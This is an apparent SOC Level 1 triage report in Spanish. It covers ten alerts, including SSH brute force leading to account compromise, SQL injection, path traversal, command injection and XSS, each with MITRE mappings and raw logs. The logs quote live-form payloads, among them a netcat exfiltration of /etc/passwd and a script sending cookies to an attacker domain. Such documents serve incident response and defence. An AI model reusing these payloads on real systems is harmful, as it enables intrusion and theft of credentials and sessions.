# 🚨 Reporte de Triaje de Incidentes — SOC Nivel 1

**Fecha de Generación:** `2026-11-09 00:50:01 UTC`  
**Analista SOC L1:** Gabriel Martínez (`@GabrielMartinez97`)  
**Total de Alertas Detectadas:** `10`  
**Estado del Ticket:** `ESCALADO A SOC NIVEL 2 (INCIDENT RESPONSE)`

---

## 📊 1. Resumen Ejecutivo por Severidad

| Severidad | Cantidad de Alertas | SLA de Respuesta Sugerido |
| :--- | :---: | :--- |
| 🔴 **CRITICAL** | **5** | Inmediato (< 15 min) — Escalado a SOC L2 |
| 🟠 **HIGH** | **3** | Urgente (< 1 hora) — Bloqueo y validación |
| 🟡 **MEDIUM** | **2** | Estándar (< 4 horas) — Monitoreo y regla WAF/Firewall |
| 🔵 **LOW** | **0** | Informativo (< 24 horas) |

---

## 🛡️ 2. Indicadores de Compromiso (IOCs Defanged)

> **Nota de Seguridad:** Todas las direcciones IP han sido neutralizadas (*defanged*) con `[.]` para prevenir conexiones accidentales durante el análisis.

| IP Atacante (Defanged) | Severidad Máxima | Alertas Asociadas | Técnicas MITRE ATT&CK |
| :--- | :---: | :---: | :--- |
| `185.220.101[.]45` | 🔴 CRITICAL | 2 | `T1078, T1110.001` |
| `198.51.100[.]77` | 🔴 CRITICAL | 4 | `T1083, T1190` |
| `203.0.113[.]88` | 🔴 CRITICAL | 2 | `T1059.004, T1189` |
| `45.155.205[.]109` | 🟠 HIGH | 1 | `T1110.003` |
| `91.240.118[.]222` | 🟡 MEDIUM | 1 | `T1595.002` |

---

## 🔍 3. Detalle Técnico de Alertas Priorizadas (Triage Log)

### 1. [🔴 CRITICAL] `SOC-SSH-003` — COMPROMISO DE CUENTA: Login SSH Exitoso tras Fuerza Bruta

- **Táctica MITRE ATT&CK:** Initial Access / Persistence
- **Técnica MITRE ATT&CK:** `T1078` (Valid Accounts)
- **IP de Origen (Defanged):** `185.220.101[.]45`
- **Activo / URI Objetivo:** `prod-bastion-01 (user: backup_svc)`
- **Resultado del Evento:** `SUCCESSFUL_EXPLOITATION`
- **Análisis del Analista L1:** ¡ALERTA CRÍTICA! Tras 8 intentos fallidos de fuerza bruta, la IP 185.220.101.45 logró autenticarse exitosamente (Accepted password) con el usuario 'backup_svc' en el servidor 'prod-bastion-01'.
- **Acción Recomendada / Playbook:** **ESCALAR INMEDIATAMENTE A SOC L2 / IR: 1) Desconectar sesión activa del usuario 'backup_svc', 2) Rotar credenciales, 3) Aislar el host 'prod-bastion-01' y auditar comandos ejecutados post-compromiso.**

**Evidencia Forense (Raw Logs):**
```text
Nov 08 08:20:21 prod-bastion-01 sshd[1224]: Failed password for invalid user postgres from 185.220.101.45 port 44106 ssh2
Nov 08 08:20:23 prod-bastion-01 sshd[1227]: Failed password for backup_svc from 185.220.101.45 port 44107 ssh2
Nov 08 08:20:25 prod-bastion-01 sshd[1230]: Failed password for backup_svc from 185.220.101.45 port 44108 ssh2
Nov 08 08:20:28 prod-bastion-01 sshd[1235]: Accepted password for backup_svc from 185.220.101.45 port 44109 ssh2
```

### 2. [🔴 CRITICAL] `SOC-WEB-002` — Ataque de SQL Injection (SQLi) Detectado

- **Táctica MITRE ATT&CK:** Initial Access
- **Técnica MITRE ATT&CK:** `T1190` (Exploit Public-Facing Application)
- **IP de Origen (Defanged):** `198.51.100[.]77`
- **Activo / URI Objetivo:** `/products?id=10' OR '1'='1`
- **Resultado del Evento:** `SUCCESSFUL_EXPLOITATION (HTTP 200 - 8490 bytes enviados)`
- **Análisis del Analista L1:** Se detectó un payload de inyección SQL desde 198.51.100.77 hacia '/products?id=10' OR '1'='1'. El servidor respondió con código HTTP 200 y 8490 bytes.
- **Acción Recomendada / Playbook:** **ESCALAR A SOC L2: El servidor devolvió HTTP 200 con alto volumen de bytes (posible exfiltración de tabla de usuarios). Revisar base de datos y activar regla WAF.**

**Evidencia Forense (Raw Logs):**
```text
198.51.100.77 - - [08/Nov/2026:09:15:20 +0000] "GET /products?id=10'%20OR%20'1'='1 HTTP/1.1" 200 8490 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
```

### 3. [🔴 CRITICAL] `SOC-WEB-002` — Ataque de SQL Injection (SQLi) Detectado

- **Táctica MITRE ATT&CK:** Initial Access
- **Técnica MITRE ATT&CK:** `T1190` (Exploit Public-Facing Application)
- **IP de Origen (Defanged):** `198.51.100[.]77`
- **Activo / URI Objetivo:** `/products?id=-1 UNION SELECT 1,username,password_hash FROM users--`
- **Resultado del Evento:** `SUCCESSFUL_EXPLOITATION (HTTP 200 - 12450 bytes enviados)`
- **Análisis del Analista L1:** Se detectó un payload de inyección SQL desde 198.51.100.77 hacia '/products?id=-1 UNION SELECT 1,username,password_hash FROM users--'. El servidor respondió con código HTTP 200 y 12450 bytes.
- **Acción Recomendada / Playbook:** **ESCALAR A SOC L2: El servidor devolvió HTTP 200 con alto volumen de bytes (posible exfiltración de tabla de usuarios). Revisar base de datos y activar regla WAF.**

**Evidencia Forense (Raw Logs):**
```text
198.51.100.77 - - [08/Nov/2026:09:15:24 +0000] "GET /products?id=-1%20UNION%20SELECT%201,username,password_hash%20FROM%20users-- HTTP/1.1" 200 12450 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
```

### 4. [🔴 CRITICAL] `SOC-WEB-003` — Intento de Path Traversal / Local File Inclusion (LFI)

- **Táctica MITRE ATT&CK:** Initial Access / Collection
- **Técnica MITRE ATT&CK:** `T1083` (File and Directory Discovery)
- **IP de Origen (Defanged):** `198.51.100[.]77`
- **Activo / URI Objetivo:** `/download?file=../../../../etc/passwd`
- **Resultado del Evento:** `SUCCESSFUL_EXPLOITATION (HTTP 200 - 2841 bytes enviados)`
- **Análisis del Analista L1:** La IP 198.51.100.77 intentó leer archivos del sistema operativo mediante secuencias de salto de directorio ('/download?file=../../../../etc/passwd'). Respuesta del servidor: HTTP 200 (2841 bytes).
- **Acción Recomendada / Playbook:** **ESCALAR A SOC L2: El servidor respondió HTTP 200 OK (el archivo fue leído por el atacante). Parchear endpoint vulnerable y bloquear IP.**

**Evidencia Forense (Raw Logs):**
```text
198.51.100.77 - - [08/Nov/2026:09:16:05 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841 "-" "curl/8.5.0"
```

### 5. [🔴 CRITICAL] `SOC-WEB-005` — Intento de Ejecución Remota de Comandos (OS Command Injection)

- **Táctica MITRE ATT&CK:** Execution
- **Técnica MITRE ATT&CK:** `T1059.004` (Command and Scripting Interpreter: Unix Shell)
- **IP de Origen (Defanged):** `203.0.113[.]88`
- **Activo / URI Objetivo:** `/cmd?exec=;cat /etc/passwd|nc 203.0.113.88 4444`
- **Resultado del Evento:** `BLOCKED_OR_FAILED (HTTP 500)`
- **Análisis del Analista L1:** La IP 203.0.113.88 intentó inyectar comandos de sistema y establecer una Reverse Shell con netcat ('/cmd?exec=;cat /etc/passwd|nc 203.0.113.88 4444'). Código HTTP: 500.
- **Acción Recomendada / Playbook:** **Verificar conexiones salientes hacia la IP atacante en el puerto 4444 y aislar el servidor web si existe proceso hijo de shell activo.**

**Evidencia Forense (Raw Logs):**
```text
203.0.113.88 - - [08/Nov/2026:09:22:45 +0000] "GET /cmd?exec=;cat%20/etc/passwd|nc%20203.0.113.88%204444 HTTP/1.1" 500 512 "-" "python-requests/2.31.0"
```

### 6. [🟠 HIGH] `SOC-SSH-002` — SSH Password Spraying Detectado

- **Táctica MITRE ATT&CK:** Credential Access
- **Técnica MITRE ATT&CK:** `T1110.003` (Brute Force: Password Spraying)
- **IP de Origen (Defanged):** `45.155.205[.]109`
- **Activo / URI Objetivo:** `prod-bastion-01`
- **Resultado del Evento:** `FAILED_ATTEMPT`
- **Análisis del Analista L1:** La IP 45.155.205.109 realizó 6 intentos fallidos probando 6 usuarios distintos (deploy, devops, guest, jenkins, support, test) para evitar bloqueos por cuenta.
- **Acción Recomendada / Playbook:** **Bloquear IP en firewall perimetral y verificar que las cuentas enumeradas no existan o tengan MFA / autenticación por llave pública obligatoria.**

**Evidencia Forense (Raw Logs):**
```text
Nov 08 08:31:10 prod-bastion-01 sshd[1401]: Failed password for invalid user guest from 45.155.205.109 port 59011 ssh2
Nov 08 08:31:14 prod-bastion-01 sshd[1404]: Failed password for invalid user test from 45.155.205.109 port 59012 ssh2
Nov 08 08:31:18 prod-bastion-01 sshd[1408]: Failed password for invalid user deploy from 45.155.205.109 port 59013 ssh2
Nov 08 08:31:22 prod-bastion-01 sshd[1412]: Failed password for invalid user devops from 45.155.205.109 port 59014 ssh2
Nov 08 08:31:26 prod-bastion-01 sshd[1416]: Failed password for invalid user support from 45.155.205.109 port 59015 ssh2
Nov 08 08:31:30 prod-bastion-01 sshd[1420]: Failed password for invalid user jenkins from 45.155.205.109 port 59016 ssh2
```

### 7. [🟠 HIGH] `SOC-WEB-003` — Intento de Path Traversal / Local File Inclusion (LFI)

- **Táctica MITRE ATT&CK:** Initial Access / Collection
- **Técnica MITRE ATT&CK:** `T1083` (File and Directory Discovery)
- **IP de Origen (Defanged):** `198.51.100[.]77`
- **Activo / URI Objetivo:** `/download?file=../../../../etc/shadow`
- **Resultado del Evento:** `BLOCKED_OR_FAILED (HTTP 403)`
- **Análisis del Analista L1:** La IP 198.51.100.77 intentó leer archivos del sistema operativo mediante secuencias de salto de directorio ('/download?file=../../../../etc/shadow'). Respuesta del servidor: HTTP 403 (162 bytes).
- **Acción Recomendada / Playbook:** **El servidor bloqueó la lectura (HTTP 403/404). Monitorear y bloquear IP en WAF.**

**Evidencia Forense (Raw Logs):**
```text
198.51.100.77 - - [08/Nov/2026:09:16:09 +0000] "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 162 "-" "curl/8.5.0"
```

### 8. [🟠 HIGH] `SOC-WEB-004` — Ataque Cross-Site Scripting (XSS) Detectado

- **Táctica MITRE ATT&CK:** Initial Access
- **Técnica MITRE ATT&CK:** `T1189` (Drive-by Compromise)
- **IP de Origen (Defanged):** `203.0.113[.]88`
- **Activo / URI Objetivo:** `/search?q=<script>fetch('http://c2.attacker-domain.xyz/collect?c='+document.cookie)</script>`
- **Resultado del Evento:** `SUCCESSFUL_EXPLOITATION (HTTP 200 - 3102 bytes enviados)`
- **Análisis del Analista L1:** Se detectó inyección de script malicioso orientado a robo de sesión/cookies desde 203.0.113.88 en '/search?q=<script>fetch('http://c2.attacker-domain.xyz/collect?c='+document.cookie)</script>'.
- **Acción Recomendada / Playbook:** **Bloquear dominio de comando y control (C2) referenciado en el script y sanitizar entrada.**

**Evidencia Forense (Raw Logs):**
```text
203.0.113.88 - - [08/Nov/2026:09:22:11 +0000] "GET /search?q=<script>fetch('http://c2.attacker-domain.xyz/collect?c='+document.cookie)</script> HTTP/1.1" 200 3102 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0"
```

### 9. [🟡 MEDIUM] `SOC-SSH-001` — Ataque de Fuerza Bruta SSH

- **Táctica MITRE ATT&CK:** Credential Access
- **Técnica MITRE ATT&CK:** `T1110.001` (Brute Force: Password Guessing)
- **IP de Origen (Defanged):** `185.220.101[.]45`
- **Activo / URI Objetivo:** `prod-bastion-01`
- **Resultado del Evento:** `FAILED_ATTEMPT`
- **Análisis del Analista L1:** La IP 185.220.101.45 generó 8 intentos de inicio de sesión fallidos contra el host prod-bastion-01 (usuarios atacados: admin, backup_svc, oracle, postgres, root, ubuntu).
- **Acción Recomendada / Playbook:** **Verificar si la IP pertenece a una red conocida; de lo contrario, agregar a lista de bloqueo (Blacklist / Fail2Ban).**

**Evidencia Forense (Raw Logs):**
```text
Nov 08 08:20:11 prod-bastion-01 sshd[1210]: Failed password for invalid user admin from 185.220.101.45 port 44101 ssh2
Nov 08 08:20:13 prod-bastion-01 sshd[1212]: Failed password for root from 185.220.101.45 port 44102 ssh2
Nov 08 08:20:15 prod-bastion-01 sshd[1215]: Failed password for root from 185.220.101.45 port 44103 ssh2
Nov 08 08:20:17 prod-bastion-01 sshd[1218]: Failed password for invalid user ubuntu from 185.220.101.45 port 44104 ssh2
Nov 08 08:20:19 prod-bastion-01 sshd[1221]: Failed password for invalid user oracle from 185.220.101.45 port 44105 ssh2
Nov 08 08:20:21 prod-bastion-01 sshd[1224]: Failed password for invalid user postgres from 185.220.101.45 port 44106 ssh2
Nov 08 08:20:23 prod-bastion-01 sshd[1227]: Failed password for backup_svc from 185.220.101.45 port 44107 ssh2
Nov 08 08:20:25 prod-bastion-01 sshd[1230]: Failed password for backup_svc from 185.220.101.45 port 44108 ssh2
```

### 10. [🟡 MEDIUM] `SOC-WEB-001` — Escaneo Automatizado de Vulnerabilidades (Nikto / Nmap)

- **Táctica MITRE ATT&CK:** Reconnaissance
- **Técnica MITRE ATT&CK:** `T1595.002` (Active Scanning: Vulnerability Scanning)
- **IP de Origen (Defanged):** `91.240.118[.]222`
- **Activo / URI Objetivo:** `Múltiples rutas (/phpmyadmin/index.php, /.env, /wp-config.php.bak, /server-status)`
- **Resultado del Evento:** `RECONNAISSANCE_BLOCKED (HTTP 403/404)`
- **Análisis del Analista L1:** Se detectó reconocimiento activo con herramientas automatizadas (Nikto/Nmap) desde la IP 91.240.118.222 realizando 4 peticiones a rutas sensibles (/phpmyadmin/index.php, /.env, /wp-config.php.bak, /server-status).
- **Acción Recomendada / Playbook:** **Bloquear IP en firewall/WAF por reconocimiento activo; confirmar que ninguna ruta sensible (.env, phpmyadmin, backups) haya respondido con código 200.**

**Evidencia Forense (Raw Logs):**
```text
91.240.118.222 - - [08/Nov/2026:09:10:01 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 153 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)"
91.240.118.222 - - [08/Nov/2026:09:10:02 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006452)"
91.240.118.222 - - [08/Nov/2026:09:10:03 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 153 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006499)"
91.240.118.222 - - [08/Nov/2026:09:10:04 +0000] "GET /server-status HTTP/1.1" 403 162 "-" "Scanner/Nmap NSE"
```
